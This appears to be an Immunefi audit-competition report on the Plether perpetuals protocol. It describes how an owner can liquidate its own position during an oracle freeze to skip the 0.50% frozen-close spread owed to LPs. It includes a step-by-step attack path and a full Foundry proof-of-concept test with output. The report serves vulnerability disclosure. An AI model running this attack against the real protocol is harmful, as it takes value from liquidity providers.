# \#97744 [SC-Medium] During the oracle freeze, being liquidated costs less than closing, and the owner can liquidate itself on purpose

**Submitted on Nov 2nd 2026 at 23:19:17 UTC by @marcin37 for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #97744
- **Report Type:** Smart Contract
- **Report severity:** Medium
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Summary

Outside the weekend freeze, liquidation is the costlier exit: a 0.10% charge against a 0.04% close fee. During the freeze, a voluntary close also pays LPs a 0.50% stale-mark spread and liquidation does not, so the penalty becomes the cheaper exit. The owner takes it at will: it keeps the position just above the 3% FAD line with `addMargin`, stops when it wants out and liquidates itself as keeper once carry tips it. In the PoC, a hedged trader exits its losing leg after weekend news and ends +2,770.90 USDG instead of −2,128.80; LPs end −3,972.90 instead of +526.80.

## Root cause

The spread is charged on ["voluntary oracle-frozen close/reduce notional"](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L149-L150), and only [`buildCloseState`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CloseAccountingLib.sol#L122-L124) assesses it:

```solidity
if (inputs.oracleFrozen) {
    state.frozenSpreadAssets = (notionalAssets * inputs.frozenCloseSpreadBps) / 10_000;
}
```

Frozen liquidation exits at the same cached mark, [shifted 2.5 bp](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol#L729-L742), and charges [0.10% of notional, half to the keeper](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/LiquidationAccountingLib.sol#L65-L77). Two properties let the owner choose it:

- Timing: while frozen the mark cannot move, so equity changes only through carry, [taken from the pledge first](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/MarginClearinghouseAccountingLib.sol#L95-L106) and [checked against the FAD rate](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L1450-L1471); [`addMargin`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L501-L529) works while frozen.
- Refund: the Router makes [`msg.sender` the keeper](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L706-L730) and the Engine [accepts keeper == account](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L1331-L1338), so half the penalty returns to the liquidated owner.

The docs exempt liquidation from the spread ([ACCOUNTING_SPEC](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md?plain=1#L1188), [SECURITY](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md?plain=1#L1442)) because it is forced. They do not consider an owner choosing it, or liquidation costing less than closing.

## Attack path

Conditions: release parameters, and weekend news (an election, a policy statement) that moves the reopen price while the mark is frozen, the risk the spread prices. The trader brings 70,000 USDG in two accounts.

1. Friday, live: open a 1M USDG LONG and a 1M USDG SHORT from the two accounts.
2. Every hour, `addMargin` each leg back to 0.30 USDG above its FAD line, about one hour of carry.
3. Sunday 18:00 UTC, frozen: news points to a higher reopen. Add 1,000 USDG to the SHORT; stop topping up the LONG.
4. After 67 minutes, the LONG account calls `executeLiquidation` on itself, exits at 1.00025 and gets back 500 USDG as keeper.
5. After the reopen, close the SHORT 0.50% higher.

Carry is deterministic, so the trader knows the tipping second. A third-party keeper landing first takes the 500 USDG share, and the trader still ends about 2,270 USDG ahead.

## Impact

**Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol).** LPs lose the spread they are owed, and the trader profits from it:

| USDG | Control: close | Attack: self-liquidation |
| --- | --- | --- |
| LONG account net result | −6,312.87 | −1,413.16 |
| Trader net result | −2,128.80 | +2,770.90 |
| LP value change | +526.80 | −3,972.90 |
| Treasury fees | 1,602.00 | 1,202.00 |

The trader's 4,899.70 USDG gain equals the LPs' 4,499.70 loss plus the 400 USDG close fee: the 5,000 USDG spread and close VPI that liquidation skips, minus its own cost. No function collects the spread later.

With the designed exit the trade needs a reopen gap above about 0.71% to profit; self-liquidation lowers that to about 0.22% (derived from the PoC's costs, not run). The trader can repeat it on any news weekend, scaling with notional up to the 40% skew cap.

## Recommendation

Assess the frozen-close spread for LPs on liquidations executed while the oracle is frozen, so that being liquidated never costs less than closing. The PoC's attack should then cost at least as much as the control.


## Proof of Concept

Runs in the competition repository at `a82d4fe` on its `BasePerpTest` fixture (in-scope contracts, mock USDG and Pyth). `setUp` sets and asserts the release parameters from `DEPLOYMENT.md`, including the owner's timelocked Senior caps and oracle settings, then enters 14M USDG Senior and 6M Junior.

A trader opens a 1M LONG and a 1M SHORT from two accounts on Friday through `OrderRouter`, then tops both up hourly with `addMargin` to 0.30 USDG above the 3% FAD line. On Sunday, with the oracle frozen, it keeps the SHORT and drops the LONG: the control closes it voluntarily; the attack waits until carry makes it liquidatable and calls `executeLiquidation` itself. Both runs close the SHORT after a 0.50% reopen gap.

Cheatcodes: `vm.snapshotState`/`vm.revertToState` between runs, `vm.warp`/`vm.roll` for time, `vm.prank` for each account's own calls; mock USDG is minted. No protocol storage writes; the fixture's router is the production `OrderRouter` plus a legacy overload the test does not call.

## Run

Foundry 1.7.1, with forge-std from the repository's submodule. The first via-IR compile takes about 90 seconds.

```bash
git clone --recurse-submodules https://github.com/immunefi-team/audit-comp-plether.git
cd audit-comp-plether
git checkout --detach a82d4fefb02768e5b3bddcc97dee371eee24fea8
git submodule update --init --recursive
# save the code below as packages/perps/test/perps/poc/FrozenSelfLiquidationExit.t.sol
FOUNDRY_TEST=test/perps/poc forge test --root packages/perps --match-path test/perps/poc/FrozenSelfLiquidationExit.t.sol -vv
```

## Output

```text
Ran 1 test for test/perps/poc/FrozenSelfLiquidationExit.t.sol:FrozenSelfLiquidationExitTest
[PASS] test_SelfLiquidationReplacesTheFrozenCloseSpread() (gas: 36927383)
Logs:
  Reopen gap, %: 0.50
  Trader capital, USDG: 70000.000000
  Control: frozen-close spread paid to LPs, USDG: 5000.000000
  Attack: minutes from the news to the self-liquidation: 67
  Attack: liquidation price: 1.00025000
  Attack: keeper share credited back to the LONG account, USDG: 500.000000
  LONG account net result, USDG, control / attacked: -6312.865174 -1413.164599
  SHORT account net result, USDG, control / attacked: 4184.063981 4184.063981
  Trader net result, USDG, control / attacked: -2128.801193 2770.899382
  LP value change, USDG, control / attacked: 526.801286 -3972.898539
  Treasury fees, USDG, control / attacked: 1602.000000 1202.000000
```

## Code

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {ICfdEngineRiskParamsView} from "@plether/perps/interfaces/ICfdEngineRiskParamsView.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {Vm} from "forge-std/Vm.sol";

/// @notice A trader holds a 1M LONG and a 1M SHORT in two accounts over a weekend. News arrives while the oracle is
///         frozen; the trader drops the losing LONG at the Friday mark, keeps the SHORT and closes it after a 0.50%
///         reopen gap. Control: the LONG leaves through the voluntary frozen close (0.50% LP spread, 0.04% fee).
///         Attack: the trader stops topping up the LONG, carry tips it below the 3% FAD line and it liquidates itself.
contract FrozenSelfLiquidationExitTest is BasePerpTest {

    address internal constant SENIOR_LP = address(0x5E01);
    address internal constant JUNIOR_LP = address(0x1A01);
    address internal constant LONG_LEG = address(0xA11);
    address internal constant SHORT_LEG = address(0xA12);
    address internal constant KEEPER = address(0xBEEF);

    uint256 internal constant INCUMBENT_SENIOR = 14_000_000e6; // 70% Senior, inside the 80% release share cap
    uint256 internal constant INCUMBENT_JUNIOR = 6_000_000e6;
    uint256 internal constant LEG_SIZE = 1_000_000e18; // 1M USDG notional per leg at the 1.00 mark
    uint256 internal constant LEG_FUNDS = 35_000e6; // deposited by each account
    uint256 internal constant OPEN_MARGIN = 20_000e6; // 2%, above the 0.2% initial margin
    uint256 internal constant FAD_BPS = 300; // weekend margin requirement
    uint256 internal constant BUFFER = 300_000; // 0.30 USDG above the FAD line: about one hour of carry on a leg
    uint256 internal constant WINNER_TOP_UP = 1000e6; // keeps the SHORT above the FAD line until the reopen
    uint256 internal constant PRICE = 1e8; // Friday mark, frozen all weekend
    uint256 internal constant REOPEN_PRICE = 100_500_000; // +0.50% gap, under the 0.54% frozen-close charge
    uint256 internal constant LONG_LIQUIDATION_PRICE = 100_025_000; // frozen mark + 2.5 bp adverse shift
    uint256 internal constant SHORT_LIQUIDATION_PRICE = 99_975_000; // frozen mark - 2.5 bp adverse shift
    uint256 internal constant FRIDAY_OPEN = 1_709_920_800; // Fri 2024-03-08 18:00 UTC, live
    uint256 internal constant SUNDAY_NEWS = 1_710_093_600; // Sun 2024-03-10 18:00 UTC, oracle frozen
    uint256 internal constant REOPEN = 1_710_108_000; // Sun 2024-03-10 22:00 UTC, live again
    uint256 internal constant VALUATION = 1_710_111_600; // Sun 2024-03-10 23:00 UTC, both runs valued here

    bytes32 internal constant SPREAD_SETTLED = keccak256("FrozenCloseSpreadSettled(address,uint256,uint256,uint256)");
    bytes32 internal constant LIQUIDATED = keccak256("PositionLiquidated(address,uint8,uint256,uint256,uint256)");

    struct Outcome {
        uint256 waited;
        uint256 spreadPaid;
        uint256 liquidationPrice;
        uint256 keeperShare;
        int256 longLeg;
        int256 shortLeg;
        int256 trader;
        int256 lps;
        int256 treasury;
    }

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function setUp() public override {
        super.setUp();
        // The release HousePool and oracle set these in their constructors; here the owner sets them once.
        _setSeniorCapacity(40_000_000e6, 8000);
        _lpDeposit(juniorVault, JUNIOR_LP, INCUMBENT_JUNIOR);
        _lpDeposit(seniorVault, SENIOR_LP, INCUMBENT_SENIOR);
        IOrderRouterAdminHost.RouterConfig memory config = _routerConfig();
        config.adverseConfidenceMultiplierBps = 2500;
        config.minOpenNotionalAssets = 1000e6;
        _setRouterConfig(config);

        CfdTypes.RiskParams memory params = ICfdEngineRiskParamsView(address(engine)).riskParams();
        assertEq(params.vpiFactor, 0.01e18);
        assertEq(params.fadMarginBps, FAD_BPS);
        assertEq(params.bountyBps, 10);
        assertEq(params.keeperShareBps, 5000);
        assertEq(params.protocolShareBps, 0);
        assertEq(engine.executionFeeBps(), 4);
        assertEq(engine.frozenCloseSpreadBps(), 50);
        assertEq(engine.fadMaxStaleness(), 3 days);
        assertEq(router.pletherOracle().basketMaxConfidenceRatioBps(), 10);
        assertEq(router.pletherOracle().adverseConfidenceMultiplierBps(), 2500);
        assertTrue(pool.isTradingActive());
    }

    function test_SelfLiquidationReplacesTheFrozenCloseSpread() public {
        uint256 lpBefore = _lpValue();
        uint256 treasuryBefore = _treasury();

        vm.warp(FRIDAY_OPEN);
        _fundTrader(LONG_LEG, LEG_FUNDS);
        _fundTrader(SHORT_LEG, LEG_FUNDS);
        _trade(LONG_LEG, CfdTypes.Side.LONG, OPEN_MARGIN, false, PRICE);
        _trade(SHORT_LEG, CfdTypes.Side.SHORT, OPEN_MARGIN, false, PRICE);

        // The trader's bot keeps both legs just above the FAD line at hh:59; the market closes Friday 22:00 UTC.
        for (uint256 t = FRIDAY_OPEN + 59 minutes; t < SUNDAY_NEWS; t += 1 hours) {
            vm.warp(t);
            _topUp(LONG_LEG, LONG_LIQUIDATION_PRICE);
            _topUp(SHORT_LEG, SHORT_LIQUIDATION_PRICE);
        }
        vm.warp(SUNDAY_NEWS);
        assertTrue(engine.isOracleFrozen() && engine.isFadWindow(), "news arrives while the oracle is frozen");
        assertFalse(engineLens.previewLiquidation(LONG_LEG, LONG_LIQUIDATION_PRICE).liquidatable, "LONG healthy");
        assertFalse(engineLens.previewLiquidation(SHORT_LEG, SHORT_LIQUIDATION_PRICE).liquidatable, "SHORT healthy");

        // The news says the basket reopens higher: keep the SHORT, drop the LONG.
        vm.prank(SHORT_LEG);
        engine.addMargin(SHORT_LEG, WINNER_TOP_UP);

        uint256 start = vm.snapshotState();
        Outcome memory control = _dropLongAndReopen(false, lpBefore, treasuryBefore);
        vm.revertToState(start);
        Outcome memory attacked = _dropLongAndReopen(true, lpBefore, treasuryBefore);

        emit log_named_decimal_uint("Reopen gap, %", (REOPEN_PRICE - PRICE) * 10_000 / PRICE, 2);
        emit log_named_decimal_uint("Trader capital, USDG", 2 * LEG_FUNDS, 6);
        emit log_named_decimal_uint("Control: frozen-close spread paid to LPs, USDG", control.spreadPaid, 6);
        emit log_named_uint("Attack: minutes from the news to the self-liquidation", attacked.waited / 1 minutes);
        emit log_named_decimal_uint("Attack: liquidation price", attacked.liquidationPrice, 8);
        emit log_named_decimal_uint(
            "Attack: keeper share credited back to the LONG account, USDG", attacked.keeperShare, 6
        );
        _pair("LONG account net result, USDG", control.longLeg, attacked.longLeg);
        _pair("SHORT account net result, USDG", control.shortLeg, attacked.shortLeg);
        _pair("Trader net result, USDG", control.trader, attacked.trader);
        _pair("LP value change, USDG", control.lps, attacked.lps);
        _pair("Treasury fees, USDG", control.treasury, attacked.treasury);

        assertEq(control.shortLeg, attacked.shortLeg, "same SHORT result in both runs");
        assertLt(control.trader, 0, "control: the designed frozen exit makes the weekend trade a loss");
        assertGt(attacked.trader, 0, "attack: the same trade ends in profit");
        assertGt(control.lps, attacked.lps, "LPs lose what the self-liquidation saves");
        assertLe(attacked.waited, 2 hours, "the LONG tips well before the reopen");
        assertApproxEqAbs(
            attacked.trader - control.trader,
            (control.lps - attacked.lps) + (control.treasury - attacked.treasury),
            1e6,
            "the trader's saving is the LPs' and treasury's loss"
        );
    }

    function _dropLongAndReopen(
        bool selfLiquidate,
        uint256 lpBefore,
        uint256 treasuryBefore
    ) internal returns (Outcome memory outcome) {
        if (selfLiquidate) {
            while (!engineLens.previewLiquidation(LONG_LEG, LONG_LIQUIDATION_PRICE).liquidatable) {
                vm.warp(vm.getBlockTimestamp() + 1 minutes);
                outcome.waited += 1 minutes;
            }
            vm.recordLogs();
            vm.prank(LONG_LEG);
            router.executeLiquidation(LONG_LEG, new bytes[](0));
            (,, outcome.liquidationPrice, outcome.keeperShare) =
                abi.decode(_eventData(LIQUIDATED), (CfdTypes.Side, uint256, uint256, uint256));
        } else {
            vm.recordLogs();
            _trade(LONG_LEG, CfdTypes.Side.LONG, 0, true, PRICE);
            (, outcome.spreadPaid,) = abi.decode(_eventData(SPREAD_SETTLED), (uint256, uint256, uint256));
        }
        assertTrue(engine.isOracleFrozen(), "the LONG leaves during the freeze");
        (uint256 longSize,,,,,,) = engine.positions(LONG_LEG);
        assertEq(longSize, 0, "LONG closed");

        vm.warp(REOPEN);
        assertFalse(engine.isOracleFrozen() || engine.isFadWindow(), "market reopened");
        _trade(SHORT_LEG, CfdTypes.Side.SHORT, 0, true, REOPEN_PRICE);

        outcome.longLeg = _withdrawAll(LONG_LEG);
        outcome.shortLeg = _withdrawAll(SHORT_LEG);
        outcome.trader = outcome.longLeg + outcome.shortLeg;

        vm.warp(VALUATION);
        outcome.lps = int256(_lpValue()) - int256(lpBefore);
        outcome.treasury = int256(_treasury()) - int256(treasuryBefore);
    }

    /// @dev The trader's bot: tops a leg up to BUFFER above the 3% FAD line at its frozen liquidation price.
    function _topUp(
        address leg,
        uint256 liquidationPrice
    ) internal {
        int256 equity = engineLens.previewLiquidation(leg, liquidationPrice).equityAssets;
        int256 target = int256((LEG_SIZE * liquidationPrice / 1e20) * FAD_BPS / 10_000 + BUFFER);
        if (equity < target) {
            vm.prank(leg);
            engine.addMargin(leg, uint256(target - equity));
        }
    }

    function _eventData(
        bytes32 topic
    ) internal returns (bytes memory data) {
        Vm.Log[] memory logs = vm.getRecordedLogs();
        for (uint256 i; i < logs.length; ++i) {
            if (
                logs[i].topics.length > 1 && logs[i].topics[0] == topic
                    && logs[i].topics[1] == bytes32(uint256(uint160(LONG_LEG)))
            ) {
                return logs[i].data;
            }
        }
        revert("event not found");
    }

    function _withdrawAll(
        address account
    ) internal returns (int256 net) {
        uint256 free = clearinghouse.getAccountAssetBuckets(account).freeSettlementAssets;
        vm.prank(account);
        clearinghouse.withdraw(account, free);
        assertEq(clearinghouse.balanceAssets(account), 0, "nothing left behind");
        net = int256(settlementToken.balanceOf(account)) - int256(LEG_FUNDS);
    }

    function _lpValue() internal view returns (uint256) {
        return juniorVault.convertToAssets(juniorVault.balanceOf(JUNIOR_LP))
            + seniorVault.convertToAssets(seniorVault.balanceOf(SENIOR_LP));
    }

    function _treasury() internal view returns (uint256) {
        return clearinghouse.balanceAssets(engine.protocolTreasury());
    }

    function _lpDeposit(
        TrancheVault vault,
        address lp,
        uint256 assets
    ) internal {
        settlementToken.mint(lp, assets);
        vm.startPrank(lp);
        settlementToken.approve(address(vault), assets);
        uint256 requestId = vault.requestDeposit(assets, lp, lp);
        vm.stopPrank();
        vm.warp(vault.depositEpochStart(requestId));
        _keeperSettle();
        vm.prank(lp);
        vault.claimDeposit(requestId, assets, lp, lp);
    }

    function _keeperSettle() internal {
        bytes[] memory update = _mockPythUpdateData(PRICE);
        vm.prank(KEEPER);
        router.settleLpEpoch(update);
    }

    /// @dev Commits through the production Router and executes it from the same account.
    function _trade(
        address account,
        CfdTypes.Side side,
        uint256 margin,
        bool isClose,
        uint256 price
    ) internal {
        OrderV3Types.OrderRequest memory request = OrderV3Types.OrderRequest({
            clientOrderId: bytes32(uint256(router.nextCommitId())),
            side: side,
            sizeDelta: LEG_SIZE,
            marginDelta: margin,
            targetPrice: (side == CfdTypes.Side.LONG) == isClose ? type(uint256).max : 1,
            isClose: isClose,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(vm.getBlockTimestamp()) + uint64(router.maxExecutionWindowSeconds()),
                executionWindowSeconds: uint32(router.maxExecutionWindowSeconds()),
                allowedExecutionModes: 7,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: type(uint256).max,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
        vm.prank(account);
        uint64 orderId = router.commitOrder(request);
        bytes[] memory update = _mockPythUpdateData(price);
        vm.prank(account);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(orderId, update);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "order executed");
    }

    function _pair(
        string memory label,
        int256 control,
        int256 attacked
    ) internal {
        emit log(string.concat(label, ", control / attacked: ", _usdg(control), " ", _usdg(attacked)));
    }

    function _usdg(
        int256 amount
    ) internal pure returns (string memory) {
        uint256 abs = amount < 0 ? uint256(-amount) : uint256(amount);
        string memory fraction = vm.toString(abs % 1e6);
        while (bytes(fraction).length < 6) {
            fraction = string.concat("0", fraction);
        }
        return string.concat(amount < 0 ? "-" : "", vm.toString(abs / 1e6), ".", fraction);
    }

}
```

